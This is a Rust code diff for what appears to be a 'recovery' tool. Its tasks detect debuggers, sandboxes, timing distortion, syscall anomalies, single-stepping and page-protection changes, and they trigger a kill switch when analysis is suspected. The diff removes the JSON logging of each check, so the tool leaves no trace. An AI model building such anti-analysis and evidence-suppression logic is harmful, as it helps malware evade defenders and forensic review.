@@ -1,6 +1,5 @@
 use crate::recovery::{
     context::RecoveryContext,
-    output::write_json_artifact,
     task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask},
 };
 use async_trait::async_trait;
@@ -251,20 +250,12 @@ impl RecoveryTask for DebuggerDetectionTask {
         RecoveryCategory::System
     }
 
-    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
+    async fn run(&self, _ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
         let summary = collect_debugger_summary();
         if summary.suspicious {
             return Err(RecoveryError::KillSwitchTriggered);
         }
-        let artifact = write_json_artifact(
-            ctx,
-            self.category(),
-            &self.label(),
-            "behavioral-debugger-detection.json",
-            &summary,
-        )
-        .await?;
-        Ok(vec![artifact])
+        Ok(vec![])
     }
 }
 
@@ -352,20 +343,12 @@ impl RecoveryTask for EnvironmentalDiscoveryTask {
         RecoveryCategory::System
     }
 
-    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
+    async fn run(&self, _ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
         let summary = collect_environmental_summary();
         if summary.suspicious {
             return Err(RecoveryError::KillSwitchTriggered);
         }
-        let artifact = write_json_artifact(
-            ctx,
-            self.category(),
-            &self.label(),
-            "behavioral-environmental-discovery.json",
-            &summary,
-        )
-        .await?;
-        Ok(vec![artifact])
+        Ok(vec![])
     }
 }
 
@@ -525,20 +508,12 @@ impl RecoveryTask for TimingDistortionTask {
         RecoveryCategory::System
     }
 
-    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
+    async fn run(&self, _ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
         let summary = collect_timing_summary().await;
         if summary.suspicious {
             return Err(RecoveryError::KillSwitchTriggered);
         }
-        let artifact = write_json_artifact(
-            ctx,
-            self.category(),
-            &self.label(),
-            "behavioral-timing-distortion.json",
-            &summary,
-        )
-        .await?;
-        Ok(vec![artifact])
+        Ok(vec![])
     }
 }
 
@@ -619,20 +594,12 @@ impl RecoveryTask for SyscallAnomaliesTask {
         RecoveryCategory::System
     }
 
-    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
+    async fn run(&self, _ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
         let summary = inspect_syscall_anomalies();
         if summary.anomalies_detected {
             return Err(RecoveryError::KillSwitchTriggered);
         }
-        let artifact = write_json_artifact(
-            ctx,
-            self.category(),
-            &self.label(),
-            "behavioral-syscall-anomalies.json",
-            &summary,
-        )
-        .await?;
-        Ok(vec![artifact])
+        Ok(vec![])
     }
 }
 
@@ -729,20 +696,12 @@ impl RecoveryTask for SpreadValidationTask {
         RecoveryCategory::System
     }
 
-    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
+    async fn run(&self, _ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
         let summary = collect_spread_validation_summary().await;
         if summary.suspicious {
             return Err(RecoveryError::KillSwitchTriggered);
         }
-        let artifact = write_json_artifact(
-            ctx,
-            self.category(),
-            &self.label(),
-            "behavioral-spread-validation.json",
-            &summary,
-        )
-        .await?;
-        Ok(vec![artifact])
+        Ok(vec![])
     }
 }
 
@@ -844,20 +803,12 @@ impl RecoveryTask for PageProtectionTask {
         RecoveryCategory::System
     }
 
-    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
+    async fn run(&self, _ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
         let summary = inspect_page_protections();
         if summary.anomalies_detected {
             return Err(RecoveryError::KillSwitchTriggered);
         }
-        let artifact = write_json_artifact(
-            ctx,
-            self.category(),
-            &self.label(),
-            "behavioral-page-protection.json",
-            &summary,
-        )
-        .await?;
-        Ok(vec![artifact])
+        Ok(vec![])
     }
 }
 
@@ -955,20 +906,12 @@ impl RecoveryTask for SingleStepDetectionTask {
         RecoveryCategory::System
     }
 
-    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
+    async fn run(&self, _ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
         let summary = collect_single_step_summary();
         if summary.suspicious {
             return Err(RecoveryError::KillSwitchTriggered);
         }
-        let artifact = write_json_artifact(
-            ctx,
-            self.category(),
-            &self.label(),
-            "behavioral-single-step-detection.json",
-            &summary,
-        )
-        .await?;
-        Ok(vec![artifact])
+        Ok(vec![])
     }
 }
 
